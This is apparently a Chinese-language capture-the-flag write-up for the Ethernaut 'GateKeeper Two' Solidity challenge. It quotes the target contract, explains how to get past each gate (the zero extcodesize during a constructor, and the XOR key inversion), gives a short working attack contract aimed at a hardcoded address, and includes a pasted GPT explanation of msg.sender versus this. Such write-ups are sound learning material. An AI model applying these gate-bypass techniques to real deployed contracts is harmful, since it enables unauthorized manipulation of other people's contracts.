# 14-GateKeeper Two

日期: 21/08/2024
难易: 简单
漏洞小结: 绕过require
简单明了: 一些edge case以及简单算法

# 问题描述

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

### **Things that might help:**

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [Solidity Assembly](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [Solidity cheatsheet](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

# 攻击思路

还是三个gate

- gateOne还是一样，要写合约去攻击，保证`tx.origin`和`msg.sender`不一样
- gateTwo的话用到了`extcodesize`函数，这个函数有个`edge case`，就是在constructor里面被call的话，会返回零
- gateThree的话是利用了`xor`的特性，`A^B=C implies A^C =B`
    - 需要注意最后的输入是bytes8
    - 需要注意调用的时候是通过攻击合约去调用，所以msg.sender需要改成address.this

# 攻击方式

```bash
contract attackGatekeeperTwo{
    constructor(){
        GatekeeperTwo gt = GatekeeperTwo(0x3023453F54becB528f10F5f8DF851A17b96b52b4);
        bytes8 gateKey = bytes8((uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max)) ;
        gt.enter(gateKey);
    }
}
```

# Ethernuat总结

Way to go! Now that you can get past the gatekeeper, you have what it takes to join [theCyber](https://etherscan.io/address/thecyber.eth#code), a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on [reddit](https://www.reddit.com/user/0age) or via [email](mailto:0age@protonmail.com) and use it to register with the contract at [gatekeepertwo.thecyber.eth](https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) (be aware that only the first 128 entrants will be accepted by the contract).

# 小白的思考

比较ctf向，设略一下就可以了，感觉上没有很大的审计项目的意义，偏向于学习一些新的知识和概念

需要注意的点就是`msg.sender`改成了`this`，有点不理解，问了一下GPT

## `msg.sender` vs `this`

- `msg.sender` 是 Solidity 中一个全局变量，它表示当前调用合约的地址。当你在外部调用合约时，`msg.sender` 是外部账户或另一个合约的地址。
- `this` 是指当前合约本身，它返回合约的地址，并且是一个 `address` 类型。

### 为什么在 `gateThree` 中使用了 `this` 而不是 `msg.sender`？

在 `gateThree` 中，原代码使用了：

```solidity
solidityCopy code
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);

```

- 这里的 `msg.sender` 是你调用 `enter` 函数的地址。在你的攻击合约中，由于调用是通过 `this`（当前合约实例）来进行的，因此这里的 `msg.sender` 会是攻击合约的地址。

为了计算正确的 `gateKey`，你需要基于调用合约的地址（即 `this`）来计算：

```solidity
solidityCopy code
bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

```

这样确保 `gateKey` 是基于攻击合约地址计算出的正确值。

### 深入理解

在合约调用过程中，`this` 和 `msg.sender` 在某些场景下的作用是不同的：

- `this` 代表合约自身的地址，可以用于在内部进行与合约地址相关的操作。
- `msg.sender` 代表触发当前函数调用的直接调用者（可能是外部账户，也可能是其他合约），而不是合约自身。

当你要通过计算派生出一个值（如 `gateKey`），并且这个值依赖于当前合约地址时，使用 `address(this)` 是必要的。这确保了计算基于当前攻击合约的地址，而不是调用者的地址。

总结来说，使用 `address(this)` 是为了获取当前攻击合约的地址，使得计算出的 `gateKey` 正确匹配 `gateThree` 的检查逻辑。